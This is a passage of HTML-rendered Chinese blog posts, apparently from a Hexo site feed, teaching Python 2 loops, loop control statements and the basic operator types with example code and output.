punctuation">,</span> fruit<span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Current Letter <span class="token punctuation">:</span> PCurrent Letter <span class="token punctuation">:</span> yCurrent Letter <span class="token punctuation">:</span> tCurrent Letter <span class="token punctuation">:</span> hCurrent Letter <span class="token punctuation">:</span> oCurrent Letter <span class="token punctuation">:</span> nCurrent fruit <span class="token punctuation">:</span> bananaCurrent fruit <span class="token punctuation">:</span> appleCurrent fruit <span class="token punctuation">:</span> mangoGood bye!</code></pre><h4 id="按序列索引迭代"><a href="#按序列索引迭代" class="headerlink" title="按序列索引迭代"></a>按序列索引迭代</h4><p>遍历每个项的另一种方法是对序列本身进行索引偏移。以下为简单示例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>fruits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'banana'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">,</span>  <span class="token string">'mango'</span><span class="token punctuation">]</span><span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">'Current fruit :'</span><span class="token punctuation">,</span> fruits<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Current fruit <span class="token punctuation">:</span> bananaCurrent fruit <span class="token punctuation">:</span> appleCurrent fruit <span class="token punctuation">:</span> mangoGood bye!</code></pre><p>在这里，我们借助了len()内置函数，它提供了元组中元素的总数，以及range()内置函数提供了要迭代的实际序列。</p><h4 id="在For循环中使用else语句"><a href="#在For循环中使用else语句" class="headerlink" title="在For循环中使用else语句"></a>在For循环中使用else语句</h4><p>Python支持将else语句与循环语句相关联</p><p>如果<strong>else</strong>语句与<strong>for</strong>循环一起使用，则在循环迭代列表时执行<strong>else</strong>语句。</p><p>下面的示例演示了else语句与用于搜索从10到20的质数的for语句的组合。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">for</span> num <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true">#to iterate between 10 to 20</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#to iterate on the factors of the number</span>      <span class="token keyword">if</span> num<span class="token operator">%</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>         <span class="token comment" spellcheck="true">#to determine the first factor</span>         j<span class="token operator">=</span>num<span class="token operator">/</span>i             <span class="token comment" spellcheck="true">#to calculate the second factor</span>         <span class="token keyword">print</span> <span class="token string">'%d equals %d * %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>         <span class="token keyword">break</span> <span class="token comment" spellcheck="true">#to move to the next number, the #first FOR</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>                  <span class="token comment" spellcheck="true"># else part of the loop</span>      <span class="token keyword">print</span> num<span class="token punctuation">,</span> <span class="token string">'is a prime number'</span>        <span class="token keyword">break</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token number">10</span> equals <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token number">11</span> <span class="token keyword">is</span> a prime number<span class="token number">12</span> equals <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token number">13</span> <span class="token keyword">is</span> a prime number<span class="token number">14</span> equals <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token number">15</span> equals <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token number">16</span> equals <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token number">17</span> <span class="token keyword">is</span> a prime number<span class="token number">18</span> equals <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token number">19</span> <span class="token keyword">is</span> a prime number</code></pre><h3 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h3><h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p>它终止当前循环并在下一个语句处继续执行，就像C中的传统break语句一样。</p><p>break最常见的用法是当触发一些外部条件，需要匆忙退出循环时。break语句可以在while和for循环中使用。</p><p>如果使用嵌套循环，break语句将停止最内层循环的执行，并开始执行块之后的下一行代码。</p><p> 语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">break</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> <span class="token string">'Python'</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># First Example</span>   <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'h'</span><span class="token punctuation">:</span>      <span class="token keyword">break</span>   <span class="token keyword">print</span> <span class="token string">'Current Letter :'</span><span class="token punctuation">,</span> letter  var <span class="token operator">=</span> <span class="token number">10</span>                    <span class="token comment" spellcheck="true"># Second Example</span><span class="token keyword">while</span> var <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                 <span class="token keyword">print</span> <span class="token string">'Current variable value :'</span><span class="token punctuation">,</span> var   var <span class="token operator">=</span> var <span class="token operator">-</span><span class="token number">1</span>   <span class="token keyword">if</span> var <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>      <span class="token keyword">break</span><span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Current Letter <span class="token punctuation">:</span> PCurrent Letter <span class="token punctuation">:</span> yCurrent Letter <span class="token punctuation">:</span> tCurrent variable value <span class="token punctuation">:</span> <span class="token number">10</span>Current variable value <span class="token punctuation">:</span> <span class="token number">9</span>Current variable value <span class="token punctuation">:</span> <span class="token number">8</span>Current variable value <span class="token punctuation">:</span> <span class="token number">7</span>Current variable value <span class="token punctuation">:</span> <span class="token number">6</span>Good bye!</code></pre><h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p>它将控件返回到while循环的开始。continue语句拒绝当前循环迭代中的所有剩余语句，并将控件移回循环顶部。</p><p>continue语句可以在while和for循环中使用。</p><p> 语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">continue</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> <span class="token string">'Python'</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># First Example</span>   <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'h'</span><span class="token punctuation">:</span>      <span class="token keyword">continue</span>   <span class="token keyword">print</span> <span class="token string">'Current Letter :'</span><span class="token punctuation">,</span> lettervar <span class="token operator">=</span> <span class="token number">10</span>                    <span class="token comment" spellcheck="true"># Second Example</span><span class="token keyword">while</span> var <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                 var <span class="token operator">=</span> var <span class="token operator">-</span><span class="token number">1</span>   <span class="token keyword">if</span> var <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>      <span class="token keyword">continue</span>   <span class="token keyword">print</span> <span class="token string">'Current variable value :'</span><span class="token punctuation">,</span> var<span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Current Letter <span class="token punctuation">:</span> PCurrent Letter <span class="token punctuation">:</span> yCurrent Letter <span class="token punctuation">:</span> tCurrent Letter <span class="token punctuation">:</span> oCurrent Letter <span class="token punctuation">:</span> nCurrent variable value <span class="token punctuation">:</span> <span class="token number">9</span>Current variable value <span class="token punctuation">:</span> <span class="token number">8</span>Current variable value <span class="token punctuation">:</span> <span class="token number">7</span>Current variable value <span class="token punctuation">:</span> <span class="token number">6</span>Current variable value <span class="token punctuation">:</span> <span class="token number">4</span>Current variable value <span class="token punctuation">:</span> <span class="token number">3</span>Current variable value <span class="token punctuation">:</span> <span class="token number">2</span>Current variable value <span class="token punctuation">:</span> <span class="token number">1</span>Current variable value <span class="token punctuation">:</span> <span class="token number">0</span>Good bye!</code></pre><h4 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h4><p>当在语法上需要一条语句，但您不想执行任何命令或代码时，使用它。</p><p>pass语句是一个空操作;当它执行时，什么也没有发生。pass在你的代码最终要去的地方也很有用，但还没有写出来(例如，在存根中)</p><p> 语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">pass</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> <span class="token string">'Python'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'h'</span><span class="token punctuation">:</span>      <span class="token keyword">pass</span>      <span class="token keyword">print</span> <span class="token string">'This is pass block'</span>   <span class="token keyword">print</span> <span class="token string">'Current Letter :'</span><span class="token punctuation">,</span> letter<span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Current Letter <span class="token punctuation">:</span> PCurrent Letter <span class="token punctuation">:</span> yCurrent Letter <span class="token punctuation">:</span> tThis <span class="token keyword">is</span> <span class="token keyword">pass</span> blockCurrent Letter <span class="token punctuation">:</span> hCurrent Letter <span class="token punctuation">:</span> oCurrent Letter <span class="token punctuation">:</span> nGood bye!</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Decision </tag>
            
            <tag> Loops </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 5</title>
      <link href="posts/143.html"/>
      <url>posts/143.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><blockquote><p>运算符相对于语法里的动词，加减乘除。</p></blockquote><h2 id="Ax-Python-Basic-Operators-运算符"><a href="#Ax-Python-Basic-Operators-运算符" class="headerlink" title="Ax Python Basic Operators | 运算符"></a>Ax Python Basic Operators | 运算符</h2><p>运算符可以操作数据，比如4+5=9，加号和等于号就相对于运算符。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>Arithmetic Operators | 算术</li><li>Comparison (Relational) Operators | 关系或比较</li><li>Assignment Operators | 赋值</li><li>Logical Operators | 逻辑</li><li>Bitwise Operators | 按位</li><li>Membership Operators | 成员</li><li>Identity Operators | 身份</li></ul><h4 id="算术"><a href="#算术" class="headerlink" title="算术"></a>算术</h4><p>假设变量a为10，变量b为20，则−</p><table><thead><tr><th align="center">Operator</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">+ Addition</td><td align="center">在操作符的任意一边添加值。</td><td align="center">a + b = 30</td></tr><tr><td align="center">- Subtraction</td><td align="center">从左操作数减去右操作数。</td><td align="center">a – b = -10</td></tr><tr><td align="center">* Multiplication</td><td align="center">将运算符两边的值相乘</td><td align="center">a * b = 200</td></tr><tr><td align="center">/ Division</td><td align="center">将左操作数除以右操作数</td><td align="center">b / a = 2</td></tr><tr><td align="center">% Modulus</td><td align="center">左操作数除以右操作数，返回余数</td><td align="center">b % a = 0</td></tr><tr><td align="center">** Exponent</td><td align="center">对运算符执行指数(幂)计算</td><td align="center">a**b =10 to the power 20</td></tr><tr><td align="center">//</td><td align="center">上下除法——对操作数进行除法，其结果是去掉小数点后数字的商。但如果其中一个操作数为负，则结果将向下取整，即舍入0(趋近负无穷)−</td><td align="center">9//2 = 4 and 9.0//2.0 = 4.0, -11//3 = -4, -11.0//3 = -4.0</td></tr></tbody></table><p>例</p><p>假设变量 a 持有 21，变量 b 持有 10</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>a <span class="token operator">=</span> <span class="token number">21</span>b <span class="token operator">=</span> <span class="token number">10</span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token keyword">print</span> <span class="token string">"Line 1 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token keyword">print</span> <span class="token string">"Line 2 - Value of c is "</span><span class="token punctuation">,</span> c c <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token keyword">print</span> <span class="token string">"Line 3 - Value of c is "</span><span class="token punctuation">,</span> c c <span class="token operator">=</span> a <span class="token operator">/</span> b<span class="token keyword">print</span> <span class="token string">"Line 4 - Value of c is "</span><span class="token punctuation">,</span> c c <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token keyword">print</span> <span class="token string">"Line 5 - Value of c is "</span><span class="token punctuation">,</span> ca <span class="token operator">=</span> <span class="token number">2</span>b <span class="token operator">=</span> <span class="token number">3</span>c <span class="token operator">=</span> a<span class="token operator">**</span>b <span class="token keyword">print</span> <span class="token string">"Line 6 - Value of c is "</span><span class="token punctuation">,</span> ca <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">5</span>c <span class="token operator">=</span> a<span class="token operator">//</span>b <span class="token keyword">print</span> <span class="token string">"Line 7 - Value of c is "</span><span class="token punctuation">,</span> c</code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Line <span class="token number">1</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">31</span>Line <span class="token number">2</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">11</span>Line <span class="token number">3</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">210</span>Line <span class="token number">4</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">2</span>Line <span class="token number">5</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">1</span>Line <span class="token number">6</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">8</span>Line <span class="token number">7</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">2</span></code></pre><h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p>这些运算符比较它们两边的值，并决定它们之间的关系。它们也被称为关系操作符。</p><p>假设变量a为10，变量b为20，则−</p><table><thead><tr><th align="center">Operator</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">如果两个操作数的值相等，则条件为真。</td><td align="center">(a == b) is not true.</td></tr><tr><td align="center">!=</td><td align="center">如果两个操作数的值不相等，则条件为真</td><td align="center">(a != b) is true.</td></tr><tr><td align="center">&lt;&gt;</td><td align="center">如果两个操作数的值不相等，则条件为真</td><td align="center">(a &lt;&gt; b) is true. This is similar to != operator.</td></tr><tr><td align="center">&gt;</td><td align="center">如果左操作数的值大于右操作数的值，则条件为真</td><td align="center">(a &gt; b) is not true.</td></tr><tr><td align="center">&lt;</td><td align="center">如果左操作数的值小于右操作数的值，则条件为真。</td><td align="center">(a &lt; b) is true.</td></tr><tr><td align="center">&gt;=</td><td align="center">如果左操作数的值大于或等于右操作数的值，则条件为真。</td><td align="center">(a &gt;= b) is not true.</td></tr><tr><td align="center">&lt;=</td><td align="center">如果左操作数的值小于或等于右操作数的值，则条件为真。</td><td align="center">(a &lt;= b) is true.</td></tr></tbody></table><p>例</p><p>假设变量 a 为 10，变量 b 为 20</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>a <span class="token operator">=</span> <span class="token number">21</span>b <span class="token operator">=</span> <span class="token number">10</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token operator">==</span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 1 - a is equal to b"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 1 - a is not equal to b"</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token operator">!=</span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 2 - a is not equal to b"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 2 - a is equal to b"</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token operator">&lt;></span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 3 - a is not equal to b"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 3 - a is equal to b"</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token operator">&lt;</span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 4 - a is less than b"</span> <span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 4 - a is not less than b"</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token operator">></span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 5 - a is greater than b"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 5 - a is not greater than b"</span>a <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token operator">&lt;=</span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 6 - a is either less than or equal to  b"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 6 - a is neither less than nor equal to  b"</span><span class="token keyword">if</span> <span class="token punctuation">(</span> b <span class="token operator">>=</span> a <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 7 - b is either greater than  or equal to b"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 7 - b is neither greater than  nor equal to b"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Line <span class="token number">1</span> <span class="token operator">-</span> a <span class="token keyword">is</span> <span class="token operator">not</span> equal to bLine <span class="token number">2</span> <span class="token operator">-</span> a <span class="token keyword">is</span> <span class="token operator">not</span> equal to bLine <span class="token number">3</span> <span class="token operator">-</span> a <span class="token keyword">is</span> <span class="token operator">not</span> equal to bLine <span class="token number">4</span> <span class="token operator">-</span> a <span class="token keyword">is</span> <span class="token operator">not</span> less than bLine <span class="token number">5</span> <span class="token operator">-</span> a <span class="token keyword">is</span> greater than bLine <span class="token number">6</span> <span class="token operator">-</span> a <span class="token keyword">is</span> either less than <span class="token operator">or</span> equal to bLine <span class="token number">7</span> <span class="token operator">-</span> b <span class="token keyword">is</span> either greater than <span class="token operator">or</span> equal to b</code></pre><h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><p>假设变量 a 为 10，变量 b 为 20</p><table><thead><tr><th align="center">Operator</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center"><code>=</code></td><td align="center">将右操作数赋值给左操作数</td><td align="center">c = a + b assigns value of a + b into c</td></tr><tr><td align="center"><code>+=</code> Add AND</td><td align="center">它将右操作数添加到左操作数，并将结果赋给左操作数</td><td align="center">c += a is equivalent to c = c + a</td></tr><tr><td align="center"><code>-=</code> Subtract AND</td><td align="center">它从左操作数减去右操作数，并将结果赋值给左操作数</td><td align="center">c -= a is equivalent to c = c - a</td></tr><tr><td align="center"><code>*=</code> Multiply AND</td><td align="center">它将右操作数与左操作数相乘，并将结果赋给左操作数</td><td align="center">c *= a is equivalent to c = c * a</td></tr><tr><td align="center"><code>/=</code> Divide AND</td><td align="center">它将左操作数与右操作数除法，并将结果赋值给左操作数</td><td align="center">c /= a is equivalent to c = c / a</td></tr><tr><td align="center"><code>%=</code> Modulus AND</td><td align="center">它使用两个操作数取模，并将结果赋值给左操作数</td><td align="center">c %= a is equivalent to c = c % a</td></tr><tr><td align="center"><code>**=</code> Exponent AND</td><td align="center">对运算符执行指数(幂)计算，并将值赋给左操作数</td><td align="center">c **= a is equivalent to c = c ** a</td></tr><tr><td align="center"><code>//=</code> Floor Division</td><td align="center">它对操作符执行下除法，并将值赋给左操作数</td><td align="center">c //= a is equivalent to c = c // a</td></tr></tbody></table><p>例</p><p>假设变量 a 为 10，变量 b 为 20</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>a <span class="token operator">=</span> <span class="token number">21</span>b <span class="token operator">=</span> <span class="token number">10</span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token keyword">print</span> <span class="token string">"Line 1 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">+=</span> a<span class="token keyword">print</span> <span class="token string">"Line 2 - Value of c is "</span><span class="token punctuation">,</span> c c <span class="token operator">*=</span> a<span class="token keyword">print</span> <span class="token string">"Line 3 - Value of c is "</span><span class="token punctuation">,</span> c c <span class="token operator">/=</span> a <span class="token keyword">print</span> <span class="token string">"Line 4 - Value of c is "</span><span class="token punctuation">,</span> c c  <span class="token operator">=</span> <span class="token number">2</span>c <span class="token operator">%=</span> a<span class="token keyword">print</span> <span class="token string">"Line 5 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">**=</span> a<span class="token keyword">print</span> <span class="token string">"Line 6 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">//=</span> a<span class="token keyword">print</span> <span class="token string">"Line 7 - Value of c is "</span><span class="token punctuation">,</span> c</code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Line <span class="token number">1</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">31</span>Line <span class="token number">2</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">52</span>Line <span class="token number">3</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">1092</span>Line <span class="token number">4</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">52</span>Line <span class="token number">5</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">2</span>Line <span class="token number">6</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">2097152</span>Line <span class="token number">7</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">99864</span></code></pre><h4 id="按位"><a href="#按位" class="headerlink" title="按位"></a>按位</h4><p>Python 语言支持以下按位运算符</p><table><thead><tr><th align="center">Operator</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">&amp; Binary AND</td><td align="center">如果两个操作数中都存在一个位，操作符就向结果复制一个位</td><td align="center">(a &amp; b) (means 0000 1100)</td></tr><tr><td align="center">| Binary OR</td><td align="center">如果它存在于任意一个操作数中，它就复制一个位</td><td align="center">(a | b) = 61 (means 0011 1101)</td></tr><tr><td align="center">^ Binary XOR</td><td align="center">如果位是在一个操作数中设置的，而不是在两个操作数中设置的，则复制该位。</td><td align="center">(a ^ b) = 49 (means 0011 0001)</td></tr><tr><td align="center">~ Binary Ones Complement</td><td align="center">它是一元的，具有“翻转”比特的效果。</td><td align="center">(~a ) = -61 (means 1100 0011 in 2’s complement form due to a signed binary number.</td></tr><tr><td align="center">&lt;&lt; Binary Left Shift</td><td align="center">左操作数值向左移动由右操作数指定的位数。</td><td align="center">a &lt;&lt; 2 = 240 (means 1111 0000)</td></tr><tr><td align="center">&gt;&gt; Binary Right Shift</td><td align="center">左操作数的值会向右移动由右操作数指定的位数</td><td align="center">a &gt;&gt; 2 = 15 (means 0000 1111)</td></tr></tbody></table><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>a <span class="token operator">=</span> <span class="token number">60</span>            <span class="token comment" spellcheck="true"># 60 = 0011 1100 </span>b <span class="token operator">=</span> <span class="token number">13</span>            <span class="token comment" spellcheck="true"># 13 = 0000 1101 </span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">&amp;</span> b<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"># 12 = 0000 1100</span><span class="token keyword">print</span> <span class="token string">"Line 1 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">=</span> a <span class="token operator">|</span> b<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"># 61 = 0011 1101 </span><span class="token keyword">print</span> <span class="token string">"Line 2 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"># 49 = 0011 0001</span><span class="token keyword">print</span> <span class="token string">"Line 3 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">=</span> <span class="token operator">~</span>a<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true"># -61 = 1100 0011</span><span class="token keyword">print</span> <span class="token string">"Line 4 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true"># 240 = 1111 0000</span><span class="token keyword">print</span> <span class="token string">"Line 5 - Value of c is "</span><span class="token punctuation">,</span> cc <span class="token operator">=</span> a <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true"># 15 = 0000 1111</span><span class="token keyword">print</span> <span class="token string">"Line 6 - Value of c is "</span><span class="token punctuation">,</span> c</code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Line <span class="token number">1</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">12</span>Line <span class="token number">2</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">61</span>Line <span class="token number">3</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">49</span>Line <span class="token number">4</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token operator">-</span><span class="token number">61</span>Line <span class="token number">5</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">240</span>Line <span class="token number">6</span> <span class="token operator">-</span> Value of c <span class="token keyword">is</span> <span class="token number">15</span></code></pre><h4 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h4><p>Python 语言支持以下逻辑运算符。假设变量 a 持有 10，变量 b 持有 20</p><table><thead><tr><th align="center">Operator</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">and Logical AND</td><td align="center">如果两个操作数都为真，则条件为真。</td><td align="center">(a and b) is true.</td></tr><tr><td align="center">or Logical OR</td><td align="center">如果两个操作数有一个非零，则条件为真.</td><td align="center">(a or b) is true.</td></tr><tr><td align="center">not Logical NOT</td><td align="center">用于反转其操作数的逻辑状态。</td><td align="center">Not(a and b) is false.</td></tr></tbody></table><h4 id="成员"><a href="#成员" class="headerlink" title="成员"></a>成员</h4><p>Python 的成员资格运算符测试序列中的成员资格，例如字符串、列表或元组。有两个会员运营商，如下所述 -</p><table><thead><tr><th align="center">Operator</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">in</td><td align="center">如果在指定序列中找到变量，则计算为true，否则为false。</td><td align="center">x in y, here in results in a 1 if x is a member of sequence y.</td></tr><tr><td align="center">not in</td><td align="center">如果在指定序列中没有找到变量，则计算为true，否则为false。</td><td align="center">x not in y, here not in results in a 1 if x is not a member of sequence y.</td></tr></tbody></table><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">20</span>list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token keyword">in</span> list <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 1 - a is available in the given list"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 1 - a is not available in the given list"</span><span class="token keyword">if</span> <span class="token punctuation">(</span> b <span class="token operator">not</span> <span class="token keyword">in</span> list <span class="token punctuation">)</span><span 